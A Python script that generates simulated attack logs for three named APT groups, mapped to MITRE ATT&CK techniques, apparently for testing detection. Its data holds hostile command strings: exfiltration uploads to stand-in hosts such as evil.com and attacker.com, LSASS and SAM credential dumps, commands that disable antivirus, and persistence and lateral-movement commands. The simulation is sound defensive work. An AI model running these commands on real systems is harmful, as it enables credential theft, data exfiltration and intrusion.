#!/usr/bin/env python3

import sys
import chromadb
from datetime import datetime, timedelta
from typing import Dict, List, Any
from random import choice, randint, uniform, shuffle

sys.path.append(".")


class RealisticATPGenerator:
    def __init__(self, chromadb_path="./data/chromadb"):
        self.base_timestamp = datetime.now()
        self.attack_chains = {
            "apt29_cozy_bear": {
                "initial_access": [
                    {
                        "id": "T1566.001",
                        "name": "Spearphishing Attachment",
                        "tactic": "Initial Access",
                        "process": "outlook.exe",
                        "cmd": "outlook.exe /c load invoice_june.pdf.exe",
                        "indicators": ["malicious_attachment", "email_delivery"],
                        "severity": "high",
                    },
                    {
                        "id": "T1566.002",
                        "name": "Spearphishing Link",
                        "tactic": "Initial Access",
                        "process": "chrome.exe",
                        "cmd": "chrome.exe --new-window https://malicious-site.com",
                        "indicators": ["malicious_link", "browser_exploit"],
                        "severity": "high",
                    },
                    {
                        "id": "T1190",
                        "name": "Exploit Public-Facing Application",
                        "tactic": "Initial Access",
                        "process": "w3wp.exe",
                        "cmd": "w3wp.exe -exploit CVE-2021-44228",
                        "indicators": ["web_exploit", "log4j"],
                        "severity": "critical",
                    },
                ],
                "execution": [
                    {
                        "id": "T1059.001",
                        "name": "PowerShell",
                        "tactic": "Execution",
                        "process": "powershell.exe",
                        "cmd": "powershell.exe -WindowStyle Hidden -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAA=",
                        "indicators": ["powershell.exe", "base64_payload"],
                        "severity": "high",
                    },
                    {
                        "id": "T1059.003",
                        "name": "Windows Command Shell",
                        "tactic": "Execution",
                        "process": "cmd.exe",
                        "cmd": "cmd.exe /c whoami && net user /domain",
                        "indicators": ["cmd_execution", "recon"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1204.002",
                        "name": "Malicious File",
                        "tactic": "Execution",
                        "process": "rundll32.exe",
                        "cmd": "rundll32.exe evil.dll,DllMain",
                        "indicators": ["dll_execution", "rundll32"],
                        "severity": "high",
                    },
                ],
                "persistence": [
                    {
                        "id": "T1547.001",
                        "name": "Registry Run Keys",
                        "tactic": "Persistence",
                        "process": "reg.exe",
                        "cmd": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /d C:\\temp\\evil.exe",
                        "indicators": ["registry_persistence", "autostart"],
                        "severity": "high",
                    },
                    {
                        "id": "T1053.005",
                        "name": "Scheduled Task",
                        "tactic": "Persistence",
                        "process": "schtasks.exe",
                        "cmd": "schtasks.exe /create /tn WindowsDefender /tr C:\\temp\\backdoor.exe /sc daily",
                        "indicators": ["scheduled_task", "persistence"],
                        "severity": "medium",
                    },
                ],
                "defense_evasion": [
                    {
                        "id": "T1055",
                        "name": "Process Injection",
                        "tactic": "Defense Evasion",
                        "process": "svchost.exe",
                        "cmd": "rundll32.exe shell32.dll,ShellExecA",
                        "indicators": ["process_injection", "dll_loading"],
                        "severity": "high",
                    },
                    {
                        "id": "T1070.004",
                        "name": "File Deletion",
                        "tactic": "Defense Evasion",
                        "process": "cmd.exe",
                        "cmd": "del /f /q C:\\temp\\dropper.exe",
                        "indicators": ["file_deletion", "cleanup"],
                        "severity": "low",
                    },
                    {
                        "id": "T1112",
                        "name": "Modify Registry",
                        "tactic": "Defense Evasion",
                        "process": "reg.exe",
                        "cmd": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /v DisableAntiSpyware /d 1",
                        "indicators": ["registry_modification", "av_disable"],
                        "severity": "critical",
                    },
                ],
                "credential_access": [
                    {
                        "id": "T1003.001",
                        "name": "LSASS Memory",
                        "tactic": "Credential Access",
                        "process": "lsass.exe",
                        "cmd": "procdump.exe -ma lsass.exe lsass.dmp",
                        "indicators": ["lsass_dump", "credential_theft"],
                        "severity": "critical",
                    },
                    {
                        "id": "T1003.002",
                        "name": "Security Account Manager",
                        "tactic": "Credential Access",
                        "process": "reg.exe",
                        "cmd": "reg.exe save HKLM\\SAM C:\\temp\\sam.hive",
                        "indicators": ["sam_dump", "credential_theft"],
                        "severity": "critical",
                    },
                    {
                        "id": "T1110.001",
                        "name": "Password Guessing",
                        "tactic": "Credential Access",
                        "process": "net.exe",
                        "cmd": "net.exe use \\\\target\\admin$ /user:administrator password123",
                        "indicators": ["password_spray", "smb_auth"],
                        "severity": "medium",
                    },
                ],
                "discovery": [
                    {
                        "id": "T1083",
                        "name": "File and Directory Discovery",
                        "tactic": "Discovery",
                        "process": "cmd.exe",
                        "cmd": "dir /s /b C:\\*.doc C:\\*.pdf C:\\*.xls",
                        "indicators": ["file_enumeration", "document_search"],
                        "severity": "low",
                    },
                    {
                        "id": "T1016",
                        "name": "System Network Configuration Discovery",
                        "tactic": "Discovery",
                        "process": "ipconfig.exe",
                        "cmd": "ipconfig.exe /all && route print",
                        "indicators": ["network_discovery", "system_recon"],
                        "severity": "low",
                    },
                    {
                        "id": "T1057",
                        "name": "Process Discovery",
                        "tactic": "Discovery",
                        "process": "tasklist.exe",
                        "cmd": "tasklist.exe /v /fo csv",
                        "indicators": ["process_enumeration", "system_recon"],
                        "severity": "low",
                    },
                ],
                "lateral_movement": [
                    {
                        "id": "T1021.001",
                        "name": "Remote Desktop Protocol",
                        "tactic": "Lateral Movement",
                        "process": "mstsc.exe",
                        "cmd": "mstsc.exe /v:10.0.1.50",
                        "indicators": ["rdp_connection", "lateral_movement"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1021.002",
                        "name": "SMB/Windows Admin Shares",
                        "tactic": "Lateral Movement",
                        "process": "net.exe",
                        "cmd": "net.exe use \\\\10.0.1.50\\admin$ /user:domain\\admin password",
                        "indicators": ["smb_connection", "admin_share"],
                        "severity": "high",
                    },
                    {
                        "id": "T1047",
                        "name": "Windows Management Instrumentation",
                        "tactic": "Lateral Movement",
                        "process": "wmic.exe",
                        "cmd": "wmic.exe /node:10.0.1.50 process call create cmd.exe",
                        "indicators": ["wmi_execution", "remote_execution"],
                        "severity": "high",
                    },
                ],
                "collection": [
                    {
                        "id": "T1005",
                        "name": "Data from Local System",
                        "tactic": "Collection",
                        "process": "findstr.exe",
                        "cmd": "findstr.exe /s /i password C:\\*.txt C:\\*.doc",
                        "indicators": ["data_collection", "keyword_search"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1039",
                        "name": "Data from Network Shared Drive",
                        "tactic": "Collection",
                        "process": "robocopy.exe",
                        "cmd": "robocopy.exe \\\\fileserver\\documents C:\\temp\\stolen /s /e",
                        "indicators": ["data_staging", "network_copy"],
                        "severity": "high",
                    },
                    {
                        "id": "T1560.001",
                        "name": "Archive via Utility",
                        "tactic": "Collection",
                        "process": "7z.exe",
                        "cmd": "7z.exe a -p123 stolen.7z C:\\temp\\documents\\*",
                        "indicators": ["data_compression", "archive_creation"],
                        "severity": "medium",
                    },
                ],
                "exfiltration": [
                    {
                        "id": "T1041",
                        "name": "Exfiltration Over C2",
                        "tactic": "Exfiltration",
                        "process": "curl.exe",
                        "cmd": "curl.exe -X POST -d @stolen.7z https://evil.com/upload",
                        "indicators": ["data_exfiltration", "c2_communication"],
                        "severity": "critical",
                    },
                    {
                        "id": "T1048.003",
                        "name": "Exfiltration Over Web Service",
                        "tactic": "Exfiltration",
                        "process": "powershell.exe",
                        "cmd": "Invoke-RestMethod -Uri https://dropbox.com/upload -Method POST -Body $data",
                        "indicators": ["cloud_upload", "web_service"],
                        "severity": "high",
                    },
                ],
            },
            "apt1_comment_crew": {
                "initial_access": [
                    {
                        "id": "T1190",
                        "name": "Exploit Public-Facing Application",
                        "tactic": "Initial Access",
                        "process": "w3wp.exe",
                        "cmd": "w3wp.exe -exploit CVE-2021-44228",
                        "indicators": ["web_exploit", "log4j"],
                        "severity": "critical",
                    },
                    {
                        "id": "T1566.001",
                        "name": "Spearphishing Attachment",
                        "tactic": "Initial Access",
                        "process": "winword.exe",
                        "cmd": "winword.exe malicious_doc.docx",
                        "indicators": ["malicious_document", "macro_enabled"],
                        "severity": "high",
                    },
                ],
                "execution": [
                    {
                        "id": "T1059.003",
                        "name": "Windows Command Shell",
                        "tactic": "Execution",
                        "process": "cmd.exe",
                        "cmd": "cmd.exe /c whoami && net user /domain",
                        "indicators": ["cmd_execution", "domain_recon"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1047",
                        "name": "Windows Management Instrumentation",
                        "tactic": "Execution",
                        "process": "wmic.exe",
                        "cmd": "wmic.exe process call create notepad.exe",
                        "indicators": ["wmi_execution", "process_creation"],
                        "severity": "high",
                    },
                    {
                        "id": "T1569.002",
                        "name": "Service Execution",
                        "tactic": "Execution",
                        "process": "sc.exe",
                        "cmd": "sc.exe create evilservice binpath= C:\\temp\\backdoor.exe",
                        "indicators": ["service_creation", "persistence"],
                        "severity": "high",
                    },
                ],
                "persistence": [
                    {
                        "id": "T1547.001",
                        "name": "Registry Run Keys",
                        "tactic": "Persistence",
                        "process": "reg.exe",
                        "cmd": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftUpdate /d C:\\temp\\update.exe",
                        "indicators": ["registry_persistence", "autostart"],
                        "severity": "high",
                    },
                    {
                        "id": "T1053.005",
                        "name": "Scheduled Task",
                        "tactic": "Persistence",
                        "process": "schtasks.exe",
                        "cmd": "schtasks.exe /create /tn SystemMaintenance /tr C:\\temp\\maint.exe /sc onlogon",
                        "indicators": ["scheduled_task", "logon_trigger"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1543.003",
                        "name": "Windows Service",
                        "tactic": "Persistence",
                        "process": "sc.exe",
                        "cmd": "sc.exe create WindowsHelper binpath= C:\\Windows\\System32\\helper.exe start= auto",
                        "indicators": ["service_install", "system32_masquerade"],
                        "severity": "high",
                    },
                ],
                "defense_evasion": [
                    {
                        "id": "T1070.004",
                        "name": "File Deletion",
                        "tactic": "Defense Evasion",
                        "process": "cmd.exe",
                        "cmd": "del /f /q C:\\temp\\dropper.exe && del /f /q C:\\temp\\*.log",
                        "indicators": ["file_deletion", "cleanup"],
                        "severity": "low",
                    },
                    {
                        "id": "T1036.005",
                        "name": "Match Legitimate Name or Location",
                        "tactic": "Defense Evasion",
                        "process": "svchost.exe",
                        "cmd": "copy evil.exe C:\\Windows\\System32\\svchost.exe",
                        "indicators": ["masquerading", "system_file"],
                        "severity": "high",
                    },
                    {
                        "id": "T1562.001",
                        "name": "Disable or Modify Tools",
                        "tactic": "Defense Evasion",
                        "process": "powershell.exe",
                        "cmd": "Set-MpPreference -DisableRealtimeMonitoring $true",
                        "indicators": ["av_disable", "powershell"],
                        "severity": "critical",
                    },
                ],
                "credential_access": [
                    {
                        "id": "T1003.002",
                        "name": "Security Account Manager",
                        "tactic": "Credential Access",
                        "process": "reg.exe",
                        "cmd": "reg.exe save HKLM\\SAM C:\\temp\\sam.save",
                        "indicators": ["sam_dump", "registry_save"],
                        "severity": "critical",
                    },
                    {
                        "id": "T1110.003",
                        "name": "Password Spraying",
                        "tactic": "Credential Access",
                        "process": "net.exe",
                        "cmd": "net.exe use \\\\dc01\\ipc$ password123 /user:administrator",
                        "indicators": ["password_spray", "smb_auth"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1552.001",
                        "name": "Credentials In Files",
                        "tactic": "Credential Access",
                        "process": "findstr.exe",
                        "cmd": "findstr.exe /s /i password *.txt *.ini *.cfg",
                        "indicators": ["credential_search", "file_search"],
                        "severity": "low",
                    },
                ],
                "discovery": [
                    {
                        "id": "T1083",
                        "name": "File and Directory Discovery",
                        "tactic": "Discovery",
                        "process": "dir.exe",
                        "cmd": "dir /s /b C:\\Users\\*\\Documents\\*.doc*",
                        "indicators": ["file_enumeration", "document_search"],
                        "severity": "low",
                    },
                    {
                        "id": "T1018",
                        "name": "Remote System Discovery",
                        "tactic": "Discovery",
                        "process": "net.exe",
                        "cmd": 'net.exe view /domain && net.exe group "Domain Computers" /domain',
                        "indicators": ["network_enumeration", "domain_discovery"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1082",
                        "name": "System Information Discovery",
                        "tactic": "Discovery",
                        "process": "systeminfo.exe",
                        "cmd": "systeminfo.exe && wmic.exe computersystem get model,name,manufacturer",
                        "indicators": ["system_recon", "hardware_info"],
                        "severity": "low",
                    },
                ],
                "lateral_movement": [
                    {
                        "id": "T1021.002",
                        "name": "SMB/Windows Admin Shares",
                        "tactic": "Lateral Movement",
                        "process": "net.exe",
                        "cmd": "net.exe use \\\\target01\\admin$ /user:domain\\compromised_user password",
                        "indicators": ["smb_lateral", "admin_share"],
                        "severity": "high",
                    },
                    {
                        "id": "T1569.002",
                        "name": "Service Execution",
                        "tactic": "Lateral Movement",
                        "process": "sc.exe",
                        "cmd": "sc.exe \\\\target01 create remotesvc binpath= C:\\windows\\system32\\cmd.exe",
                        "indicators": ["remote_service", "lateral_exec"],
                        "severity": "high",
                    },
                    {
                        "id": "T1021.001",
                        "name": "Remote Desktop Protocol",
                        "tactic": "Lateral Movement",
                        "process": "mstsc.exe",
                        "cmd": "mstsc.exe /v:target01.domain.local /u:domain\\user",
                        "indicators": ["rdp_lateral", "interactive_logon"],
                        "severity": "medium",
                    },
                ],
                "collection": [
                    {
                        "id": "T1005",
                        "name": "Data from Local System",
                        "tactic": "Collection",
                        "process": "robocopy.exe",
                        "cmd": "robocopy.exe C:\\Users\\*\\Documents C:\\temp\\collected /s /e",
                        "indicators": ["data_staging", "document_theft"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1039",
                        "name": "Data from Network Shared Drive",
                        "tactic": "Collection",
                        "process": "xcopy.exe",
                        "cmd": "xcopy.exe \\\\fileserver\\shared\\* C:\\temp\\network_data /s /e /h",
                        "indicators": ["network_theft", "share_access"],
                        "severity": "high",
                    },
                    {
                        "id": "T1113",
                        "name": "Screen Capture",
                        "tactic": "Collection",
                        "process": "powershell.exe",
                        "cmd": "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')",
                        "indicators": ["screenshot", "screen_capture"],
                        "severity": "low",
                    },
                ],
                "exfiltration": [
                    {
                        "id": "T1041",
                        "name": "Exfiltration Over C2",
                        "tactic": "Exfiltration",
                        "process": "powershell.exe",
                        "cmd": "Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -InFile C:\\temp\\stolen.zip",
                        "indicators": ["http_exfil", "web_upload"],
                        "severity": "critical",
                    },
                    {
                        "id": "T1048.003",
                        "name": "Exfiltration Over Web Service",
                        "tactic": "Exfiltration",
                        "process": "curl.exe",
                        "cmd": "curl.exe -F file=@stolen.zip https://transfer.sh/",
                        "indicators": ["file_sharing", "public_service"],
                        "severity": "high",
                    },
                ],
            },
            "lazarus_group": {
                "initial_access": [
                    {
                        "id": "T1566.002",
                        "name": "Spearphishing Link",
                        "tactic": "Initial Access",
                        "process": "chrome.exe",
                        "cmd": "chrome.exe --new-window https://fake-crypto-exchange.com/login",
                        "indicators": ["malicious_link", "crypto_theme"],
                        "severity": "high",
                    },
                    {
                        "id": "T1566.001",
                        "name": "Spearphishing Attachment",
                        "tactic": "Initial Access",
                        "process": "excel.exe",
                        "cmd": "excel.exe crypto_portfolio.xlsm",
                        "indicators": ["malicious_macro", "excel_document"],
                        "severity": "high",
                    },
                    {
                        "id": "T1195.002",
                        "name": "Compromise Software Supply Chain",
                        "tactic": "Initial Access",
                        "process": "installer.exe",
                        "cmd": "installer.exe /S /SILENT TradingApp_v2.3.exe",
                        "indicators": ["supply_chain", "trojanized_app"],
                        "severity": "critical",
                    },
                ],
                "execution": [
                    {
                        "id": "T1204.002",
                        "name": "Malicious File",
                        "tactic": "Execution",
                        "process": "rundll32.exe",
                        "cmd": "rundll32.exe C:\\temp\\crypto.dll,StartTrading",
                        "indicators": ["dll_execution", "crypto_lure"],
                        "severity": "high",
                    },
                    {
                        "id": "T1059.005",
                        "name": "Visual Basic",
                        "tactic": "Execution",
                        "process": "wscript.exe",
                        "cmd": "wscript.exe C:\\temp\\market_data.vbs",
                        "indicators": ["vbs_execution", "script_host"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1059.007",
                        "name": "JavaScript",
                        "tactic": "Execution",
                        "process": "wscript.exe",
                        "cmd": "wscript.exe //B //E:JScript C:\\temp\\trading_bot.js",
                        "indicators": ["js_execution", "trading_theme"],
                        "severity": "medium",
                    },
                ],
                "persistence": [
                    {
                        "id": "T1547.009",
                        "name": "Shortcut Modification",
                        "tactic": "Persistence",
                        "process": "cmd.exe",
                        "cmd": 'copy /y evil.exe "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\CryptoTracker.exe"',
                        "indicators": ["startup_folder", "shortcut_abuse"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1546.003",
                        "name": "Windows Management Instrumentation Event Subscription",
                        "tactic": "Persistence",
                        "process": "wmic.exe",
                        "cmd": 'wmic.exe /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name="CryptoFilter", Query="SELECT * FROM Win32_ProcessStartTrace"',
                        "indicators": ["wmi_persistence", "event_subscription"],
                        "severity": "high",
                    },
                    {
                        "id": "T1547.001",
                        "name": "Registry Run Keys",
                        "tactic": "Persistence",
                        "process": "reg.exe",
                        "cmd": "reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v CryptoWallet /d C:\\temp\\wallet.exe",
                        "indicators": ["user_registry", "wallet_theme"],
                        "severity": "high",
                    },
                ],
                "defense_evasion": [
                    {
                        "id": "T1112",
                        "name": "Modify Registry",
                        "tactic": "Defense Evasion",
                        "process": "reg.exe",
                        "cmd": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0",
                        "indicators": ["uac_bypass", "privilege_escalation"],
                        "severity": "high",
                    },
                    {
                        "id": "T1027",
                        "name": "Obfuscated Files or Information",
                        "tactic": "Defense Evasion",
                        "process": "certutil.exe",
                        "cmd": "certutil.exe -decode C:\\temp\\encoded_payload.txt C:\\temp\\decoded.exe",
                        "indicators": ["file_encoding", "certutil_abuse"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1055.012",
                        "name": "Process Hollowing",
                        "tactic": "Defense Evasion",
                        "process": "explorer.exe",
                        "cmd": "CreateProcess suspended -> WriteProcessMemory -> ResumeThread",
                        "indicators": ["process_hollowing", "code_injection"],
                        "severity": "critical",
                    },
                ],
                "credential_access": [
                    {
                        "id": "T1555.003",
                        "name": "Credentials from Web Browsers",
                        "tactic": "Credential Access",
                        "process": "powershell.exe",
                        "cmd": "[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($data,$null,'CurrentUser'))",
                        "indicators": ["browser_theft", "dpapi_decrypt"],
                        "severity": "high",
                    },
                    {
                        "id": "T1552.002",
                        "name": "Credentials in Registry",
                        "tactic": "Credential Access",
                        "process": "reg.exe",
                        "cmd": "reg.exe query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v DefaultPassword",
                        "indicators": ["registry_creds", "autologon"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1555.004",
                        "name": "Windows Credential Manager",
                        "tactic": "Credential Access",
                        "process": "vaultcmd.exe",
                        "cmd": 'vaultcmd.exe /list && vaultcmd.exe /listcreds:"Windows Credentials"',
                        "indicators": ["credential_vault", "stored_creds"],
                        "severity": "high",
                    },
                ],
                "discovery": [
                    {
                        "id": "T1016",
                        "name": "System Network Configuration Discovery",
                        "tactic": "Discovery",
                        "process": "ipconfig.exe",
                        "cmd": "ipconfig.exe /all && arp.exe -a && route.exe print",
                        "indicators": ["network_recon", "routing_info"],
                        "severity": "low",
                    },
                    {
                        "id": "T1033",
                        "name": "System Owner/User Discovery",
                        "tactic": "Discovery",
                        "process": "whoami.exe",
                        "cmd": "whoami.exe /all && net.exe user %USERNAME%",
                        "indicators": ["user_discovery", "privilege_check"],
                        "severity": "low",
                    },
                    {
                        "id": "T1012",
                        "name": "Query Registry",
                        "tactic": "Discovery",
                        "process": "reg.exe",
                        "cmd": "reg.exe query HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid",
                        "indicators": ["system_fingerprint", "machine_guid"],
                        "severity": "low",
                    },
                ],
                "lateral_movement": [
                    {
                        "id": "T1021.004",
                        "name": "SSH",
                        "tactic": "Lateral Movement",
                        "process": "ssh.exe",
                        "cmd": "ssh.exe user@192.168.1.100 -i C:\\temp\\stolen_key.pem",
                        "indicators": ["ssh_lateral", "key_auth"],
                        "severity": "medium",
                    },
                    {
                        "id": "T1550.002",
                        "name": "Pass the Hash",
                        "tactic": "Lateral Movement",
                        "process": "wmic.exe",
                        "cmd": "wmic.exe /node:target /user:domain\\user process call create cmd.exe",
                        "indicators": ["pth_attack", "ntlm_relay"],
                        "severity": "high",
                    },
                    {
                        "id": "T1021.003",
                        "name": "Distributed Component Object Model",
                        "tactic": "Lateral Movement",
                        "process": "dcomcnfg.exe",
                        "cmd": "Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList cmd.exe",
                        "indicators": ["dcom_lateral", "wmi_remote"],
                        "severity": "high",
                    },
                ],
                "collection": [
                    {
                        "id": "T1115",
                        "name": "Clipboard Data",
                        "tactic": "Collection",
                        "process": "powershell.exe",
                        "cmd": "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()",
                        "indicators": ["clipboard_theft", "crypto_addresses"],
                        "severity": "high",
                    },
                    {
                        "id": "T1005",
                        "name": "Data from Local System",
                        "tactic": "Collection",
                        "process": "findstr.exe",
                        "cmd": 'findstr.exe /s /i "wallet\\|bitcoin\\|ethereum\\|private key" C:\\Users\\*\\*',
                        "indicators": ["crypto_search", "wallet_theft"],
                        "severity": "critical",
                    },
                    {
                        "id": "T1560.001",
                        "name": "Archive via Utility",
                        "tactic": "Collection",
                        "process": "winrar.exe",
                        "cmd": "winrar.exe a -ep1 -r -hp123456 stolen_wallets.rar C:\\temp\\crypto_data\\*",
                        "indicators": ["data_compression", "password_protected"],
                        "severity": "medium",
                    },
                ],
                "exfiltration": [
                    {
                        "id": "T1048.003",
                        "name": "Exfiltration Over Web Service",
                        "tactic": "Exfiltration",
                        "process": "powershell.exe",
                        "cmd": "Invoke-RestMethod -Uri https://api.telegram.org/bot123:ABC/sendDocument -Method POST -Form @{document=Get-Item stolen_wallets.rar}",
                        "indicators": ["telegram_exfil", "messaging_service"],
                        "severity": "critical",
                    },
                    {
                        "id": "T1041",
                        "name": "Exfiltration Over C2",
                        "tactic": "Exfiltration",
                        "process": "curl.exe",
                        "cmd": "curl.exe -X POST -F wallet_data=@crypto_keys.txt https://lazarus-c2.onion/upload",
                        "indicators": ["tor_exfil", "crypto_theft"],
                        "severity": "critical",
                    },
                ],
            },
        }

    def connect_chromadb(self, path):
        try:
            return chromadb.PersistentClient(path=path)
        except:
            return None

    def calculate_detection_confidence(self, technique, client):
        if not client:
            return 0.5

        try:
            collection = client.get_collection("mitre_techniques")
            query = f"{technique['name']} {technique['tactic']} {' '.join(technique['indicators'])}"
            results = collection.query(query_texts=[query], n_results=3)

            if results and results["distances"][0]:
                avg_distance = sum(results["distances"][0]) / len(
                    results["distances"][0]
                )
                confidence = max(0.5, min(0.95, 1.0 - avg_distance))
                return round(confidence, 2)
        except:
            pass

        return 0.5

    def calculate_false_positive_rate(self, technique, client):
        if not client:
            return 0.3

        try:
            collection = client.get_collection("detection_rules")
            query = f"{technique['process']} {technique['cmd']}"
            results = collection.query(query_texts=[query], n_results=3)

            matches = len(results["documents"][0]) if results else 0
            if matches >= 2:
                return round(uniform(0.05, 0.15), 2)
            elif matches == 1:
                return round(uniform(0.15, 0.25), 2)
            else:
                return round(uniform(0.25, 0.40), 2)
        except:
            pass

        return 0.3

    def generate_realistic_attack_sequence(
        self, apt_group: str, num_logs: int, chromadb_path: str
    ) -> List[Dict[str, Any]]:
        client = self.connect_chromadb(chromadb_path)

        if apt_group not in self.attack_chains:
            return []

        attack_phases = self.attack_chains[apt_group]
        logs = []

        # Build realistic attack sequence
        phase_order = [
            "initial_access",
            "execution",
            "persistence",
            "defense_evasion",
            "credential_access",
            "discovery",
            "lateral_movement",
            "collection",
            "exfiltration",
        ]

        used_techniques = set()
        current_time = self.base_timestamp

        for i in range(num_logs):
            # Choose phase based on attack progression
            if i < 2:
                phase = "initial_access"
            elif i < 4:
                phase = choice(["execution", "persistence"])
            elif i < 7:
                phase = choice(["defense_evasion", "credential_access", "discovery"])
            elif i < 12:
                phase = choice(["lateral_movement", "collection"])
            else:
                phase = choice(["collection", "exfiltration"])

            # Fallback if phase doesn't exist
            if phase not in attack_phases:
                phase = choice(list(attack_phases.keys()))

            # Select technique from phase, avoid immediate repeats
            available_techniques = [
                t
                for t in attack_phases[phase]
                if t["id"] not in used_techniques or len(used_techniques) > 5
            ]
            if not available_techniques:
                available_techniques = attack_phases[phase]

            technique = choice(available_techniques)
            used_techniques.add(technique["id"])

            # Keep only last 5 techniques in used set to allow eventual reuse
            if len(used_techniques) > 5:
                used_techniques.clear()
                used_techniques.add(technique["id"])

            # Vary timing realistically
            if phase in ["initial_access", "persistence"]:
                time_gap = randint(1, 3)  # Quick initial moves
            elif phase in ["discovery", "collection"]:
                time_gap = randint(5, 15)  # Slower recon/collection
            else:
                time_gap = randint(2, 8)  # Normal progression

            current_time += timedelta(minutes=time_gap)

            log = {
                "timestamp": current_time.isoformat(),
                "event_type": "atp_simulation",
                "apt_group": apt_group,
                "mitre_technique": technique["id"],
                "technique_name": technique["name"],
                "tactic": technique["tactic"],
                "severity": technique["severity"],
                "source_ip": f"192.168.{randint(100,200)}.{randint(1,254)}",
                "target_host": f"victim-{randint(1,20):02d}",
                "process_name": technique["process"],
                "command_line": technique["cmd"],
                "success": (
                    choice([True, True, True, False])
                    if technique["severity"] != "critical"
                    else choice([True, True, False])
                ),
                "threat_score": {
                    "low": randint(1, 3),
                    "medium": randint(4, 6),
                    "high": randint(7, 8),
                    "critical": randint(9, 10),
                }.get(technique["severity"], 5),
                "indicators": technique["indicators"],
                "detection_confidence": self.calculate_detection_confidence(
                    technique, client
                ),
                "false_positive_probability": self.calculate_false_positive_rate(
                    technique, client
                ),
            }
            logs.append(log)

        return logs

    # Keep old method for backward compatibility
    def generate_realistic_logs(
        self, apt_group: str, num_logs: int, chromadb_path: str
    ) -> List[Dict[str, Any]]:
        return self.generate_realistic_attack_sequence(
            apt_group, num_logs, chromadb_path
        )


def test_realistic_generator():
    generator = RealisticATPGenerator()
    chromadb_path = "./data/chromadb"

    logs = generator.generate_realistic_attack_sequence(
        "apt29_cozy_bear", 15, chromadb_path
    )

    print("Generated realistic attack sequence:")
    for i, log in enumerate(logs, 1):
        print(
            f"{i:2d}. {log['mitre_technique']} - {log['tactic']} - {log['technique_name']}"
        )

    return logs


if __name__ == "__main__":
    test_realistic_generator()
